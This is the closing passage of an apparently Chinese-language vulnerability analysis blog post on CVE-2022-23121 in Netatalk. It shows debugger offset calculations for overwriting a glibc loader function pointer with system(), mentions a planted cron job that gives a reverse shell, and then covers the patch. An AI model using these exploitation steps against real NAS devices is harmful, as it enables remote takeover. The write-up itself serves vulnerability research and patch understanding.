</span></span><span style=display:flex><span>  __rtld_lock_lock_recursive <span style=color:#f92672>(</span>GL<span style=color:#f92672>(</span>dl_load_lock<span style=color:#f92672>))</span>;
</span></span></code></pre></div><p><code>_rtld_global</code>地址为<code>0x7efeac865060</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gef➤  p &amp;_rtld_global
</span></span><span style=display:flex><span>$4 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>struct rtld_global *<span style=color:#f92672>)</span> 0x7efeac865060 &lt;_rtld_global&gt;
</span></span></code></pre></div><p><code>__rtld_lock_lock_recursive</code> 函数指针及参数<code>dl_load_lock</code>均为全局变量<code>_rtld_global</code>的成员</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/27.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#  define GL(name) _rtld_local._##name
</span></span></span><span style=display:flex><span><span style=color:#75715e># else
</span></span></span><span style=display:flex><span><span style=color:#75715e>#  define GL(name) _rtld_global._##name
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#960050;background-color:#1e0010>定义在</span>_rtld_local<span style=color:#f92672>=</span>_rtld_global
</span></span></code></pre></div><p>初始化过的全局变量存放在.data段，在ld.so中.data段的偏移为<code>0x2e060</code>。</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/28.png></p><p>此时可以利用任意写将获取到的<code>system</code>函数地址覆盖到<code>__rtld_lock_lock_recursive</code> 内，并且将要执行的命令放入<code>_dl_load_lock</code> 即可造成命令执行。</p><p><strong>命令执行</strong></p><p>此前说过任意写是将<code>map + ad.ADEID_RFORK.off</code> 处长为<code>ad.ADEID_RFORK.len</code>的数据写入到<code>map + ad.ADEID_FINDERI.off + 0x20</code> 内，而在分配大小小于<code>0x1000</code>情况下，<code>mmap</code>函数分配的内存刚好在<code>data</code>段上面，此时<code>mmap</code>分配的内存地址距离要覆盖的<code>_dl_load_lock</code> 参数为<code>0x2968</code>，以此可得<code>ad.ADEID_FINDERI.off=0x2940</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$7 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>__rtld_lock_recursive_t *<span style=color:#f92672>)</span> 0x7efeac865968 &lt;_rtld_global+2312&gt;
</span></span><span style=display:flex><span>gef➤  p &amp;_rtld_global._dl_load_lock Quit
</span></span><span style=display:flex><span>gef➤  p 0x7efeac865968 - 0x7efeac863000
</span></span><span style=display:flex><span>$8 <span style=color:#f92672>=</span> 0x2968
</span></span></code></pre></div><p>同时还要覆盖到<code>__rtld_lock_lock_recursive</code> 函数指针，测算可得至少需要复制<code>0x600</code>的长度才能覆盖到函数指针，此处可以设置复制长度为0x620</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gef➤  p &amp;_rtld_global._dl_rtld_lock_recursive
</span></span><span style=display:flex><span>$10 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>void <span style=color:#f92672>(</span>**<span style=color:#f92672>)(</span>void *<span style=color:#f92672>))</span> 0x7efeac865f68 &lt;_rtld_global+3848&gt;
</span></span><span style=display:flex><span>gef➤  p 0x7efeac865f68 - 0x7efeac863000
</span></span><span style=display:flex><span>$11 <span style=color:#f92672>=</span> 0x2f68
</span></span><span style=display:flex><span>gef➤  p 0x2f68 - 0x2968
</span></span><span style=display:flex><span>$12 <span style=color:#f92672>=</span> 0x600
</span></span></code></pre></div><p>利用上述偏移，加上计算得到的<code>system</code>函数地址，生成可用文件，如下：</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/29.png></p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/30.png></p><p>此时在目标主机内已有了该定时任务，在攻击机上监听2333端口即可收到反弹的<code>shell</code></p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/31.png></p><h3 id=补丁分析>补丁分析</h3><p>在Netatalk3.1.13版本中修复了该漏洞，在新版本中，先检查if中的条件而后给ad指向的结构体赋值，如果if中条件为真，也就是可能发生了越界则直接打印错误消息而后return -1，只有if条件不满足才继续赋值，从而防止了adouble结构体含有不正确的偏移，在外层函数获取到的偏移在范围内从而修复了该漏洞。</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/32.png></p><h3 id=函数解释>函数解释</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#f92672>**</span><span style=color:#66d9ef>void</span><span style=color:#f92672>**</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>memmove</span> (<span style=color:#f92672>**</span><span style=color:#66d9ef>void</span><span style=color:#f92672>**</span> <span style=color:#f92672>*</span>__dest, <span style=color:#f92672>**</span><span style=color:#66d9ef>const</span><span style=color:#f92672>**</span> <span style=color:#f92672>**</span><span style=color:#66d9ef>void</span><span style=color:#f92672>**</span> <span style=color:#f92672>*</span>__src, size_t __n)
</span></span><span style=display:flex><span><span style=color:#75715e>// dest指向要复制的目标内存，src指向要复制的数据内存，n为要复制的大小（字节）
</span></span></span><span style=display:flex><span><span style=color:#75715e>// 如果dest和src指向的内存重叠，该函数仍然可以正常处理，逻辑如下
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> str[] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;memmove can be very useful......&#34;</span>;
</span></span><span style=display:flex><span>memmove (str<span style=color:#f92672>+</span><span style=color:#ae81ff>20</span>,str<span style=color:#f92672>+</span><span style=color:#ae81ff>15</span>,<span style=color:#ae81ff>11</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>// 输出为 memmove can be very very useful.
</span></span></span></code></pre></div><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/72fq1gp2.bmp></p><h3 id=参考链接>参考链接</h3><blockquote><p><a href=https://code.woboq.org/userspace/glibc/elf/dl-open.c.html#_dl_open target=_blank>https://code.woboq.org/userspace/glibc/elf/dl-open.c.html#_dl_open</a></p><p><a href=https://nosec.org/home/detail/4997.html target=_blank>https://nosec.org/home/detail/4997.html</a></p><p><a href=https://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/ target=_blank>https://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/</a></p></blockquote><p><strong>Created at 2023-11-23T10:46:28+08:00</strong></p><div class=last_mod>创建于:Thursday, November 23,2023</div><div class=last_mod>最后修改于: Tuesday, January 2,2024</div><div class=article-container></div><script src=https://utteranc.es/client.js repo=CppXL/blog_comment issue-term=pathname theme=github-light crossorigin=anonymous async></script></div><div id=comments></div><footer class=footline></footer></div></div><div id=navigation><a class="nav nav-prev" href=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/ title="CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析"><i class="fa fa-chevron-left"></i></a>
<a class="nav nav-next" href=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/ title="CVE-2023-36563 Wordpad Info Disclosure 分析" style=margin-right:0><i class="fa fa-chevron-right"></i></a></div></section><div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px><div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div></div><script src=/js/clipboard.min.js?1706695145></script><script src=/js/perfect-scrollbar.min.js?1706695145></script><script src=/js/perfect-scrollbar.jquery.min.js?1706695145></script><script src=/js/jquery.sticky.js?1706695145></script><script src=/js/featherlight.min.js?1706695145></script><script src=/js/highlight.pack.js?1706695145></script><script>hljs.initHighlightingOnLoad()</script><script src=/js/modernizr.custom-3.6.0.js?1706695145></script><script src=/js/learn.js?1706695145></script><script src=/js/hugo-learn.js?1706695145></script><script src=/mermaid/mermaid.js?1706695145></script><script>mermaid.initialize({startOnLoad:!0})</script><script>(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-105947713-1","auto"),ga("send","pageview")</script></body></html>